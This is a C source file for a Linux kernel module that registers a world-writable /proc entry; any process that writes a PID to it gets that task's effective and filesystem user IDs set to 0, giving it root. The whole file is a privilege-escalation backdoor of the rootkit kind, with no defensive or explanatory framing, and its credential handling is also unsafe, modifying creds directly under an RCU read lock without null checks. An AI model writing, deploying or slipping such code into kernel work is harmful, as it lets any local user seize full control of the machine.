#include "kernel_shadow.h"

static char msg[MAX_LEN_MSG];
static int m_pid_task;
static struct proc_dir_entry *m_proc_dir;

static ssize_t 
procfile_write(struct file *flip, const char *buffer,
                       size_t buffer_length, loff_t *offset)
{
  int count_read = 0;
  struct task_struct *m_task;
  struct cred *m_cred;
  struct pid *pid_struct;
  
  count_read = strncpy_from_user(msg, buffer, MAX_LEN_MSG);
  pr_info("procfile_write write to kernel %d bytes\nstrlenmsg = %d", 
        count_read, (int) strlen(msg));
  
  sscanf(msg, "%d", &m_pid_task);
  pid_struct = find_get_pid(m_pid_task);
  m_task = pid_task(pid_struct, PIDTYPE_PID);

  rcu_read_lock();
  m_cred = (struct cred *) rcu_dereference(m_task->cred);
  
  m_cred->euid.val = 0;
  m_cred->fsuid.val = 0;

  pr_info("uid = %d\n", (int) m_cred->euid.val);
  rcu_read_unlock();
  return strlen(buffer);
}

static int __init m_init()
{
  m_proc_dir = proc_create(PROCFS_NAME, 0777, NULL, &proc_dev_fops);
  
  if (m_proc_dir == NULL) {
    remove_proc_entry(PROCFS_NAME, NULL);
    pr_info("Error: Could not initialize /proc/\n");
    return -ENOMEM;
  }
  
  pr_info("/proc/%s created\n", PROCFS_NAME);  
  return 0; 
}

static void __exit m_cleanup() 
{
  remove_proc_entry(PROCFS_NAME, NULL);
  pr_info("/proc/%s removed\n", PROCFS_NAME);
}

MODULE_LICENSE("GPL"); 
module_init(m_init);
module_exit(m_cleanup);
